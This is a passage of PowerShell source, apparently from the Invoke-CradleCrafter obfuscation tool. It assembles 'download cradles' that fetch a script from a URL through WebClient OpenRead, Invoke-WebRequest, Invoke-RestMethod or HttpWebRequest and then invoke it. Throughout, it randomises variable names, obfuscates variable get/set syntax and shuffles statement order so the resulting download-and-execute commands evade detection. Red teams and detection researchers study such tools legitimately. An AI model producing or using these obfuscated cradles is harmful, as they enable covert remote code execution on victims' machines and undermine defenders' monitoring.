                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.

                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 6

                    # Since we may have += syntax if Stream option 6 is chosen, we keep getting randomized GET/SET variable syntax until $GetVar6 is an acceptable syntax.
                    # (Get-Variable VARNAME).Value+= is acceptable, but errors occur when the syntax is (Get-Variable VARNAME -ValueOnly)+=
                    Do
                    {
                        # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                        $VarsUsedInThisBlock  = @()
                        $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                        # Set all new variables from above function to current variable context (from script-level to normal-level).
                        For($k=1; $k -le $NumberOfVarNames; $k++)
                        {
                            ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                        }
                    }
                    Until(!$GetVar6.Contains(' -V'))

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $OpenRead         = $OpenRead.Replace(        $NewObjectNetWebClientTag,$GetVar1)
                    $OpenReadWithTags = $OpenReadWithTags.Replace($NewObjectNetWebClientTag,$GetVar1WithTags)

                    # Extra variables for Stream fringe case. More complicated than it should be but worth it to break out Stream into its own obfuscation type instead of being baked into Rearrange type.
                    $OpenReadForStream         = $OpenRead
                    $OpenReadForStreamWithTags = $OpenReadWithTags

                    # Encapsulate OpenRead in single quotes if basic syntax is used.
                    If($OpenRead -eq 'OpenRead')
                    {
                        $OpenReadWithTags = $OpenReadWithTags.Replace($OpenRead,("'" + $OpenRead + "'"))
                        $OpenRead         = "'" + $OpenRead + "'"
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','NetWebClient','OpenRead','OpenReadForStream','Stream2')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            # Set each 'WithTags' variable values to non-'WithTags' variable names for simplicity.
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }

                        # We have a slightly different $Stream syntax for this cradle. Renaming to generic $Stream variable for better readability of code.
                        $Stream = $Stream2

                        # If both $GetVar4 syntax ends in .Value then it must be must be encapsulated in another layer of parentheses.
                        If($GetVar4.ToLower().Contains(').value'))
                        {
                            $Response = "$GetVar1.($GetVar4)($GetVar2)"
                        }
                        Else
                        {
                            $Response = "$GetVar1.$GetVar4($GetVar2)"
                        }

                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $Stream = $Stream.Replace($NetHttpWebRequestTag,$NetHttpWebRequest)
                        $Stream = $Stream.Replace($UrlTag,$Url)
                        If($SetVar5.Contains(' '))
                        {
                            # Add extra parenthese for SetVar5 if it is a Set-Variable syntax (i.e. with whitespaces).
                            $Stream = $Stream.Replace($ResponseTag,($Response + ')'))
                            $Stream = $Stream.Replace($SRSetVarTag,($SetVar5 + '('))
                        }
                        Else
                        {
                            $Stream = $Stream.Replace($ResponseTag,$Response)
                            $Stream = $Stream.Replace($SRSetVarTag,$SetVar5)
                        }
                        $Stream = $Stream.Replace($SRGetVarTag,$GetVar5)
                        $Stream = $Stream.Replace($ResultSetVarTag,$SetVar6)
                        $Stream = $Stream.Replace($ResultGetVarTag,$GetVar6)
                        $Stream = $Stream.Replace($WRSetVarTag,$SetVar1)
                        $Stream = $Stream.Replace($WRGetVarTag,$GetVar1)

                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar3'Net.WebClient'"
                        $CommandArray += "$SetVar2'$Url'"
                        $CommandArray += "$SetVar1($NetWebClient::New())"
                        $CommandArray += "$SetVar4$OpenRead"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $ArrayIndexOrder_01_LOCAL = $ArrayIndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray.
                            $ArrayIndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            If($GetVar4.Contains(' '))
                            {
                                $CommandArray += "$SetVar1$GetVar1.($GetVar4)($GetVar2)"
                            }
                            Else
                            {
                                $CommandArray += "$SetVar1$GetVar1.$GetVar4($GetVar2)"
                            }
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            $CommandArray += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Remove single quotes if default 'OpenRead' value is used.
                        If($OpenRead.Contains("'OpenRead'"))
                        {
                            # Remove single quotes when OpenRead is used directly as a method instead of a string stored in a variable (as in above command arrangement).  
                            $OpenRead = $OpenRead.Replace("'OpenRead'","OpenRead")
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1($NetWebClient::New())"
                        $CommandArray2 += "$SetVar2'$Url'"

                        # Local-only copy of $ArrayIndexOrder_01 in case Invoke option below needs to update it for Invoke but not update this value being returned to Invoke-CradleCrafter.
                        $Array2IndexOrder_01_LOCAL = $Array2IndexOrder_01

                        # SPECIAL CASE: If $Stream is a one-liner (no ';' in $Stream) then replace current $CommandArray with just the $Stream one-liner.
                        If(!$Stream.Contains(';'))
                        {
                            $CommandArray2  = @()
                            # Overwrite the ordering of the first two array elements since now there will only be 1-2 elements in $CommandArray2.
                            $Array2IndexOrder_01_LOCAL = @(0,1)
                            $SyntaxToInvoke = $Stream
                        }
                        ElseIf($Stream.Contains('While') -AND $Stream.Contains('Try') -AND $Stream.Contains('Catch'))
                        {
                            $CommandArray2 += "$SetVar1$GetVar1.$OpenRead($GetVar2)"
                            $CommandArray2 += $Stream
                            $SyntaxToInvoke = $GetVar6
                        }
                        Else
                        {
                            # Default option.
                            # If $GetVar4 was encapsulated in parentheses in $Stream for $CommandArray (not $CommandArray2) then we will remove them below for $OpenRead (and not its variable as above).
                            If($Stream.Contains("($GetVar4)"))
                            {
                                $CommandArray2 += $Stream.Replace("($GetVar4)",$OpenRead)
                            }
                            Else
                            {
                                $CommandArray2 += $Stream.Replace($GetVar4,$OpenRead)
                            }

                            $SyntaxToInvoke = $GetVar6
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {
                                # Handle if only one element is added to $CommandArray thus treating it as a string.
                                If($CommandArray.GetType().Name -eq 'String') {$Syntax = $CommandArray}
                                Else {$Syntax = ($CommandArray[$ArrayIndexOrder_01_LOCAL]   + $CommandArray[2,3,4,5,6,7] -Join ';')}
                            }
                            2 {$Syntax = ($CommandArray2[$Array2IndexOrder_01_LOCAL] + $CommandArray2[2,3,4,5]    -Join ';')}
                        }

                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        7 {
            ###################################################
            ## PsWebRequest (Invoke-WebRequest/IWR) - PS3.0+ ##
            ###################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                    If($SwitchRandom_01)
                    {
                        $Response         = "('$Url'|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        $ResponseWithTags = "('$UrlWithTags'|$ForEachRandom{($InvokeWebRequestWithTags $CurrentItemVariable)})"
                    }
                    Else
                    {
                        # Add single quotes to URL only if it contains whitespace.
                        If($Url.Contains(' '))
                        {
                            $Url = "'$Url'"
                            $UrlWithTags = $UrlWithTags.Replace($Url,"'$Url'")
                        }

                        $Response         = "($InvokeWebRequest $Url)"
                        $ResponseWithTags = "($InvokeWebRequestWithTags $UrlWithTags)"
                    }

                    # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                    $SyntaxToInvoke         = $Content2.Replace($ResponseTag,$Response)
                    $SyntaxToInvokeWithTags = $Content2WithTags.Replace($ResponseTag,$ResponseWithTags)

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }

                    # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                    $CradleSyntax         = $CradleSyntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                    $CradleSyntaxWithTags = $CradleSyntaxWithTags.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url' # Url
                    $RandomVarName2 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','Content2','InvokeWebRequest')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $Response = "($GetVar1|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $Response = "($InvokeWebRequest $GetVar1)"
                        }

                        $CommandArray += "$SetVar2$Response"

                        $ResponseVar = "$GetVar2"
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SyntaxToInvoke = $Content2.Replace($ResponseTag,$ResponseVar)

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $SyntaxToInvoke = "($GetVar1|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $SyntaxToInvoke = "($InvokeWebRequest $GetVar1)"
                        }

                        $ResponseVar = $SyntaxToInvoke
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SyntaxToInvoke = $Content2.Replace($ResponseTag,$ResponseVar)

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = $CommandArray  -Join ';'}
                            2 {$Syntax = $CommandArray2 -Join ';'}
                        }
                          
                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','Content2','InvokeWebRequest')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $Response = "($GetVar1|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $Response = "($InvokeWebRequest $GetVar1)"
                        }

                        $CommandArray += "$SetVar2$Response"

                        $ResponseVar = "$GetVar2"
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SyntaxToInvoke = $Content2.Replace($ResponseTag,$ResponseVar)

                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $SyntaxToInvoke = "($GetVar1|$ForEachRandom{($InvokeWebRequest $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $SyntaxToInvoke = "($InvokeWebRequest $GetVar1)"
                        }

                        $ResponseVar = $SyntaxToInvoke
                          
                        # Substitute appropriate tags for consistency across sub-components and differences in arrangements.
                        $SyntaxToInvoke = $Content2.Replace($ResponseTag,$ResponseVar)

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = $CommandArray  -Join ';'}
                            2 {$Syntax = $CommandArray2 -Join ';'}
                        }
                          
                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        8 {
            ###################################################
            ## PsRestMethod (Invoke-RestMethod/IRM) - PS3.0+ ##
            ###################################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 3}
            Switch($Rearrange)
            {
                1 {
                    # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                    If($SwitchRandom_01)
                    {
                        $Response         = "('$Url'|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        $ResponseWithTags = "('$UrlWithTags'|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                    }
                    Else
                    {
                        # Add single quotes to URL only if it contains whitespace.
                        If($Url.Contains(' '))
                        {
                            $Url = "'$Url'"
                            $UrlWithTags = $UrlWithTags.Replace($Url,"'$Url'")
                        }

                        $Response         = "($InvokeRestMethod $Url)"
                        $ResponseWithTags = "($InvokeRestMethod $UrlWithTags)"
                    }

                    $SyntaxToInvoke         = $Response
                    $SyntaxToInvokeWithTags = $ResponseWithTags

                    If(($Invoke.Contains($CommandTag) -AND $InvokeWithTags.Contains($CommandTag)) -OR ($Invoke.Contains($CommandEscapedStringTag) -AND $InvokeWithTags.Contains($CommandEscapedStringTag)))
                    {
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags).Replace($CommandTag, $CommandWithTags).Replace($CommandEscapedStringTag,$CommandEscapedString)
                    }
                    Else
                    {
                        If($Command) {$Command = ';' + $Command; $CommandWithTags = ';' + $CommandWithTags}
                        $CradleSyntax         = $Invoke.Replace($InvokeTag,$SyntaxToInvoke) + $Command
                        $CradleSyntaxWithTags = $InvokeWithTags.Replace($InvokeTag,$SyntaxToInvokeWithTags) + $CommandWithTags
                    }

                    # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                    $CradleSyntax         = $CradleSyntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                    $CradleSyntaxWithTags = $CradleSyntaxWithTags.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')
                }
                2 {
                    # Syntax concatenate into logical variable count and names with default variable GET/SET syntax.
                      
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'url' # Url
                    $RandomVarName2 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','InvokeWebRequest')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $Response = "($GetVar1|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $Response = "($InvokeRestMethod $GetVar1)"
                        }

                        $CommandArray += "$SetVar2$Response"

                        $SyntaxToInvoke = "$GetVar2"
                          
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $SyntaxToInvoke = "($GetVar1|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $SyntaxToInvoke = "($InvokeRestMethod $GetVar1)"
                        }

                        $ResponseVar = $SyntaxToInvoke
                          
                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = $CommandArray  -Join ';'}
                            2 {$Syntax = $CommandArray2 -Join ';'}
                        }
                          
                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                3 {
                    # Syntax concatenate into logical variable count but random names with obfuscated variable GET/SET syntax.
                      
                    $VarOptionsIndex  = 1
                    $NumberOfVarNames = 2

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex
                      
                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

                    # For all variables in $VarsUsedInThisBlock this For loop will set the appropriate VARNAME+'WithTags' values.
                    # It will also set the final $CradleSyntax and CradleSyntaxWithTags variables.
                    $VarsUsedInThisBlock += @('Invoke','Url','Command','CommandEscapedString','InvokeWebRequest')
                    For($i=1; $i -le 2; $i++)
                    {
                        $FinalVariableName = 'CradleSyntax'
                        If($i -eq 2)
                        {
                            $FinalVariableName = 'CradleSyntaxWithTags'
                            ForEach($Var in $VarsUsedInThisBlock) {Set-Variable $Var (Get-Variable ($Var + 'WithTags')).Value}
                        }
                          
                        # Set command arrangement logic here.
                        $CommandArray  = @()
                        $CommandArray += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $Response = "($GetVar1|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $Response = "($InvokeRestMethod $GetVar1)"
                        }

                        $CommandArray += "$SetVar2$Response"

                        $SyntaxToInvoke = "$GetVar2"
                          
                        $CommandArray += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray += $Command}
                        }

                        # Set alternate command arrangement logic here.
                        $CommandArray2  = @()
                        $CommandArray2 += "$SetVar1'$Url'"

                        # Randomly choose between placing cmdlet before $Url or after it (via pipes).
                        If($SwitchRandom_01)
                        {
                            $SyntaxToInvoke = "($GetVar1|$ForEachRandom{($InvokeRestMethod $CurrentItemVariable)})"
                        }
                        Else
                        {
                            $SyntaxToInvoke = "($InvokeRestMethod $GetVar1)"
                        }

                        $CommandArray2 += $Invoke.Replace($InvokeTag,$SyntaxToInvoke).Replace($CommandTag,$Command).Replace($CommandEscapedStringTag,$CommandEscapedString)

                        If(!$Invoke.Contains($CommandTag) -AND !$Invoke.Contains($CommandEscapedStringTag))
                        {
                            If($Command) {$CommandArray2 += $Command}
                        }

                        # Set command ordering arrangement logic here.
                        Switch($SwitchRandom_01)
                        {
                            1 {$Syntax = $CommandArray  -Join ';'}
                            2 {$Syntax = $CommandArray2 -Join ';'}
                        }
                          
                        # Remove .Invoke methods since this cradle is PS3.0+ and .Invoke is not needed in PS3.0+.
                        $Syntax = $Syntax.Replace('.Invoke()','<SCRIPTBLOCKINVOKETAG>').Replace('.Invoke(','(').Replace('.Invoke(','(').Replace('<SCRIPTBLOCKINVOKETAG>','.Invoke()')

                        Set-Variable $FinalVariableName $Syntax
                    }
                }
                default {Write-Error "An invalid `$Rearrange value ($Rearrange) was passed to switch block for Out-Cradle `$Cradle value ($Cradle)."; Exit}
            }

            # Add final cradle syntax (with and without tags) and update token value to $CradleSyntaxOptions to be returned if -ReturnAsArray Switch was specified.
            $CradleSyntaxOptions = @($CradleSyntax,$CradleSyntaxWithTags,$TokenValueUpdatedThisIteration)
        }
        9 {
            ##################################
            ## [Net.HttpWebRequest]::Create ##
            ##################################

            # Switch block for changing overall syntax arrangement depending on the level passed in with the REARRANGE option.
            # If last option in $TokenArray is ALL then we will choose the highest value for $Rearrange in the below block since each Cradle can have differing numbers of $Rearrange values.
            If($AllOptionSelected) {$Rearrange = 2}
            Switch($Rearrange)
            {
                1 {
                    # Set more logical variable names for this block.
                    $RandomVarName1 = 'wr'  # WebRequest
                    $RandomVarName2 = 'sr'  # StreamReader
                    $RandomVarName3 = 'res' # Result

                    $VarOptionsIndex  = 0
                    $NumberOfVarNames = 3

                    # This array will keep track of all variables necessary in this block's final $CommandArray syntax.
                    $VarsUsedInThisBlock  = @()
                    $VarsUsedInThisBlock += Set-GetSetVariables $NumberOfVarNames $VarOptionsIndex

                    # Set all new variables from above function to current variable context (from script-level to normal-level).
                    For($k=1; $k -le $NumberOfVarNames; $k++)
                    {
                        ForEach($VarName in @("SetVar$k","GetVar$k","SetVar$k`WithTags","GetVar$k`WithTags")) {Set-Variable $VarName (Get-Variable $VarName -Scope Script).Value}
                    }

